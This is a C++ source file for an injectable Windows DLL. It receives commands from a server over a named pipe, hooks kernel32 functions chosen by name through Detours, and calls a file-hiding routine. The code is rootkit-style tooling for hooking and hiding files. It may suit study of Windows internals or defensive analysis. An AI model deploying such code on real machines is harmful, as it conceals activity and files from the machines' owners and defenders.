#include "FileHiding.h"
#include <time.h>

extern int hideFile(const string&);

string global_function = {0};
Pipe* glob_pipe;
BOOLEAN flag = FALSE;

extern "C" LPVOID glob_pointer = nullptr;
extern "C" void AsmHook();

extern "C" VOID hookCallback()
{
	glob_pipe->sendMessage(global_function);
}

BOOL pipeHandler()
{
	LOG("Dll_log");
	int recv = 0;
	string task;
	Pipe *pipe = new Pipe(PIPE_NAME);
	LONG res = 0;
	string command;
	string func;
	string file;
	time_t rawtime;
	struct tm * timeinfo;
	try
	{
		pipe->openNamedPipe();
		
		LOGMSG("[OK] :: Pipe has been opened");

		while (true)
		{
			recv = pipe->receiveMessage(task);
			if (recv != 0)
			{
				break;
			}

			LOGMSG("[!] :: Task hasn't been received. Waiting...");
			Sleep(50);
		}
	}
	catch (string error)
	{
		LOGMSG("[ERROR] :: Can't work with named pipe from dll :: " + error);
		return FALSE;
	}

	LOGMSG("[OK] :: Task from server has been received: " + task);

	command = task.substr(0, 5);
	
	if ("-func" == command)
	{
		func = task.substr(6, task.length());
		LOGMSG("[OK] :: Function name :: " + func);

		time(&rawtime);
		timeinfo = localtime(&rawtime);
		global_function = asctime(timeinfo);
		global_function += " >> " + func;
		glob_pipe = pipe;
		
		if (FALSE == flag || nullptr == glob_pointer)
		{
			glob_pointer = (LPVOID)(GetProcAddress(GetModuleHandle("kernel32.dll"), func.c_str()));
			if (nullptr == glob_pointer)
			{
				LOGMSG("[ERROR] :: GetProcAddress :: " + to_string(GetLastError()));
				return TRUE;
			}
			flag = TRUE;
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			DetourAttach(&(PVOID&)glob_pointer, AsmHook);
			res = DetourTransactionCommit();
			if (NO_ERROR == res)
			{
				LOGMSG("[v] :: Detoured successfully func :: " + func);
			}
			else
			{
				LOGMSG(" [ERROR] :: detoured failed :: " + to_string(res) + " func :: " + func);
				return TRUE;
			}
		}
		
	}
	else if ("-hide" == command)
	{
		file = task.substr(6, task.length());
		LOGMSG("[!] From DllHook, before hideFile :: " + file);
		hideFile(file);
		LOGMSG("[!!!] After hideFile" );
		delete pipe;
	}
	else
	{
		MessageBox(NULL, "not ok", command.c_str(), MB_OK);
		return FALSE;
	}

	return TRUE;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved)
{
	LOG("Dll_log");
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		LOGMSG("[!] :: Process attach");
		DisableThreadLibraryCalls(hinstDLL);
		if (!pipeHandler())
		{
			LOGMSG("[ERROR] :: Something error in pipeHandler");
			return FALSE;
		}
	}

	LOGMSG("[!] :: Return true from dll");
	return TRUE;
}